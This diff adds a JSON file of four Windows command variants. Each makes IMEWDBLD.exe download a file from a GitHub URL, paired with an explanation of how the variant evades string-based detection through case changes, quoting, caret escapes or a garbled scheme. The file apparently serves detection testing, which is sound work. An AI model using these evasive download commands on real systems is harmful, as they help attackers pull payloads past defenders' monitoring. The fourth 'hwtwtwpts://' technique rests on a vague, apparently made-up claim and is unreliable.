@@ -1,0 +1,18 @@
+[
+  {
+    "output": "\"C:\\WINDOWS\\System32\\IME\\SHARED\\IMEWDBLD.exe\" HTTPS://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml",
+    "explanation": "Substitution technique: Changing the URI scheme from lowercase 'https://' to uppercase 'HTTPS://'. Depending on the underlying SIEM platform, database backend, or custom configurations, some keyword search optimizations are translated as strictly case-sensitive literal lookups. The Windows WinINet/WinHTTP APIs and the application process URL handlers resolve schemes case-insensitively, allowing equivalent download behavior while evading explicit case-sensitive checks for 'https://'."
+  },
+  {
+    "output": "\"C:\\WINDOWS\\System32\\IME\\SHARED\\IMEWDBLD.exe\" \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml\"",
+    "explanation": "Insertion technique: Enclosing the entire remote URL string parameter target inside explicit double quotes. The Windows execution context normalizes and passes the string down smoothly to the initialized application, while the modification introduces string border characters in the logged telemetry buffer which can disrupt simple, contiguous unquoted string boundary matching filters."
+  },
+  {
+    "output": "cmd.exe /c \"C:\\WINDOWS\\System32\\IME\\SHARED\\IMEWDBLD.exe\" http^s://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml",
+    "explanation": "Insertion technique: Utilizing a cmd.exe interpreter environment to inject a shell caret escape operator ('^') directly into the URL scheme string ('http^s://'). The parent command interpreter consumes and drops this character prior to child execution, yielding a recorded process creation footprint containing 'http^s://' that completely breaks the continuous literal verification for 'https://'."
+  },
+  {
+    "output": "\"C:\\WINDOWS\\System32\\IME\\SHARED\\IMEWDBLD.exe\" hwtwtwpts://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml",
+    "explanation": "Other technique (URL Typo Squatting parsing): Introducing ignored typos or alternative padding configurations inside the URI scheme definition block if the tool parsing engine utilizes loose split characters or custom token splitting boundaries. Assuming the target executable normalizes input strings or strips out unexpected characters inside scheme arrays prior to loading web objects, it modifies the signature footprint."
+  }
+]
